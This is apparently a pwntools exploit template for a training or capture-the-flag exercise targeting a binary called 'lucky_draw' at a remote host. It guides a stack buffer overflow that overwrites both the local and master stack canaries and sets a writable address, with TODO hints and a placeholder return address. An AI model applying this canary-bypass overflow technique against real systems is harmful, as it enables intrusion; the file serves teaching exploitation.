#!/usr/bin/env python
from pwn import *

BINARY = "./lucky_draw"

HOST = "3.34.49.33"
PORT = 1003

# Set context
context.terminal = ["tmux", "split-window", "-h"]

# Load binary
elf = context.binary = ELF(BINARY)

# GDB script
gs = """
# read(0, buf, 0x860uLL);
break *0x401421
# compare [$rbp+8](local canary) with [$fs_base+0x28](master canary)
break *0x4014E0
c
"""


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BINARY)


def attach_gdb(p: process):
    if args.REMOTE:
        return

    gdb.attach(p, gdbscript=gs)


def stage1(p):
    p.sendlineafter(b">", str(1).encode())
    p.sendlineafter(b"How many followers:", str(1).encode())

    # TODO (Exercise 3.1): Trigger the buffer overflow vulnerability
    # Steps:
    # 1. Identify the buffer's location and size
    # 2. Determine the offset to the canary
    # 3. Craft a payload to overflow the buffer without corrupting the canary
    #
    # Hint: Use GDB commands like: p/x $fs_base+0x28 to calcuate the canary offset
    payload = b"A" * 0x848  # Adjust this value based on your analysis
    #p.sendlineafter(payload)

    # TODO (Exercise 3.2): Analyze and resolve the crash in __pthread_disable_asynccancel
    # Steps:
    # 1. Investigate the cause of the crash
    # 2. Identify a writable memory area to prevent the crash
    # 3. Craft a payload to overwrite the return address
    #
    # Hint: Use "vmmap" command in GDB to examine the process's memory layout
    # Hint: Consider using elf.symbols to locate specific function addresses
    # Hint: Think about how you can use a writable area to your advantage in the exploit
    
    payload = b"A" * 0x28  # Padding
    payload += b"Z" * 0x8  # Local canary
    payload += b"B" * 0x8  # Saved RBP
    payload += p64(0x0) # Return address / p64 << 메모리상에 Little endian으로 packing 해주는 함수
    payload += b"C" * (0x830 - len(payload))
    payload += p64(0x404100)  # Writable address
    payload += b"D" * (0x848 - len(payload))
    payload += b"Z" * 0x8  # Master canary

    p.sendlineafter(b"1:", payload)
    sleep(1)


def main():
    p = conn()
    if args.GDB:
        attach_gdb(p)

    stage1(p)

    p.interactive()


if __name__ == "__main__":
    main()
